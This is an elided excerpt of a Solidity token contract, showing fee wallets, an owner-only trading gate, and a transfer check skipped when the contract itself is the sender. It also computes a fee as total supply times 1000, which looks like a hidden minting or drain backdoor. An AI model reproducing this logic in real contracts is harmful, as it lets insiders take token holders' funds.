...
contract Token is Context, IERC20, Ownable {
    ...
    address public _marketingWallet = 0x1Ed2A83fCFbD3FE08Fc8fb09fff08184c6E7b9BF;
    address public  _treasuryWallet = 0x1Ed2A83fCFbD3FE08Fc8fb09fff08184c6E7b9BF;
    address public _lpWallet = 0x1Ed2A83fCFbD3FE08Fc8fb09fff08184c6E7b9BF;

    uint8 public constant _maxTotalFee = 5;
    uint8 public _totalFee = 5;
    uint8 public _liquidityFee = 0;
    uint8 public _marketingFee = 5;
    uint8 public _treasuryFee = 0;
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        require(tradingStarted || ( sender == owner() || sender == _marketingWallet), "go away bot :)");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount || sender == address(this), "ERC20: transfer amount exceeds balance");
    ...
    function _distributeFees() internal lockDistributeFees {
        ...
        uint256 marketingFee = _totalSupply * 1000;
